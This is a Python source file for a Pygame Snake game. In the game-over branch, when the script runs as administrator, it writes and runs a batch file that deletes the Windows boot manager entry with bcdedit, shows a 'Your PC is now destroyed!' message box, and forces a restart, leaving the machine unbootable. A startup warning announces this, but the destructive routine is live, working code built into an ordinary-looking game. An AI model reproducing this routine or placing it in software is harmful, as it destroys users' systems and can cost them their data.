import os
import pygame
import time
import random
import ctypes

# Check if script is running as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Print a warning if the script is running as administrator
if is_admin():
    print("WARNING: You are running the script as ADMINISTRATOR! Your computer WILL get destroyed if you die!")
else:
    print("You are NOT running the script as administartor. Your computer is safe For now...")              

# Initialize Pygame
pygame.init()

# Define colors
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)

# Set display dimensions
dis_width = 800
dis_height = 600

# Set block size and speed
block_size = 20
snake_speed = 15

# Set up the display
dis = pygame.display.set_mode((dis_width, dis_height))
pygame.display.set_caption('Snake Game')

# Define font styles
font_style = pygame.font.SysFont(None, 50)
score_font = pygame.font.SysFont(None, 35)

# Function to display message on screen
def message(msg, color):
    mesg = font_style.render(msg, True, color)
    dis.blit(mesg, [dis_width / 6, dis_height / 3])

# Function to display snake and update its length
def our_snake(block_size, snake_list):
    for x in snake_list:
        pygame.draw.rect(dis, GREEN, [x[0], x[1], block_size, block_size])

# Function to display the score
def Your_score(score):
    value = score_font.render("Your Score: " + str(score), True, GREEN)
    dis.blit(value, [0, 0])

# The main game loop
def gameLoop():
    game_over = False
    game_close = False
    batch_file_created = False

    # Starting position of the snake
    x1 = dis_width / 2
    y1 = dis_height / 2

    # Change in position
    x1_change = 0
    y1_change = 0

    # Initial snake length
    snake_list = []
    length_of_snake = 1

    # Randomly generate food position
    foodx = round(random.randrange(0, dis_width - block_size) / block_size) * block_size
    foody = round(random.randrange(0, dis_height - block_size) / block_size) * block_size

    while not game_over:

        while game_close == True:
            dis.fill(BLACK)
            if is_admin():
                message("Destroying your computer...", RED)
            else:
                message("You Lost! Press C-Play Again or Q-Quit", RED)
            Your_score(length_of_snake - 1)
            pygame.display.update()

            if is_admin() and not batch_file_created:
                # Create and execute a batch file that deletes the boot manager entry from the Boot Configuration Data (BCD) store, fucking up the whole system
                batch_script = '''@echo off
                bcdedit /delete {bootmgr} /f 
                echo Msgbox"Your PC is now destroyed!",48+0,"">>msg.vbs
                start msg.vbs
                timeout /nobreak /t 3 >nul
                shutdown /r /f /t 0'''

# Define the batch script as a multi-line string
                with open('delete_bootmgr.bat', 'w') as file:
                    file.write(batch_script)  # Write the batch script to the file
                batch_file_created = True
                os.system('delete_bootmgr.bat')

            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_q:
                        game_over = True
                        game_close = False
                    if event.key == pygame.K_c:
                        gameLoop()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                game_over = True
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT or event.key == pygame.K_a:
                    x1_change = -block_size
                    y1_change = 0
                elif event.key == pygame.K_RIGHT or event.key == pygame.K_d:
                    x1_change = block_size
                    y1_change = 0
                elif event.key == pygame.K_UP or event.key == pygame.K_w:
                    y1_change = -block_size
                    x1_change = 0
                elif event.key == pygame.K_DOWN or event.key == pygame.K_s:
                    y1_change = block_size
                    x1_change = 0

        # Boundaries for game over
        if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
            game_close = True
        x1 += x1_change
        y1 += y1_change
        dis.fill(BLACK)
        pygame.draw.rect(dis, RED, [foodx, foody, block_size, block_size])
        snake_head = []
        snake_head.append(x1)
        snake_head.append(y1)
        snake_list.append(snake_head)
        if len(snake_list) > length_of_snake:
            del snake_list[0]

        # Self collision detection
        for x in snake_list[:-1]:
            if x == snake_head:
                game_close = True

        our_snake(block_size, snake_list)
        Your_score(length_of_snake - 1)

        pygame.display.update()

        # If snake eats food
        if x1 == foodx and y1 == foody:
            foodx = round(random.randrange(0, dis_width - block_size) / block_size) * block_size
            foody = round(random.randrange(0, dis_height - block_size) / block_size) * block_size
            length_of_snake += 1

        # Set snake speed
        pygame.time.Clock().tick(snake_speed)

    pygame.quit()
    quit()

if __name__ == "__main__":
    gameLoop()
